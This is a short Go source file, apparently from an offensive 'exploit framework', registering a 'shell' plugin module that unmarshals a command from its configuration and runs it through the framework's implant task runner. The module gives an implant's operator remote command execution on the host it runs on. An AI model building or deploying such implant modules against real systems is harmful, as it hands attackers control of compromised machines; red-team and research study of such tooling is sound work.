package modules

import (
	"context"

	"github.com/KKingZero/erebus-exploit-framwork/implant/tasks"
	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"github.com/KKingZero/erebus-exploit-framwork/pkg/plugin"
	"google.golang.org/protobuf/proto"
)

func init() {
	plugin.Global.Register(&ShellModule{})
}

type ShellModule struct{}

func (m *ShellModule) Name() string        { return "shell" }
func (m *ShellModule) Description() string { return "Execute shell commands" }

func (m *ShellModule) Execute(ctx context.Context, config []byte) ([]byte, error) {
	shellTask := &pb.ShellTask{}
	if err := proto.Unmarshal(config, shellTask); err != nil {
		return nil, err
	}
	result := tasks.RunShell(ctx, shellTask.Command, shellTask.Args)
	return proto.Marshal(result)
}
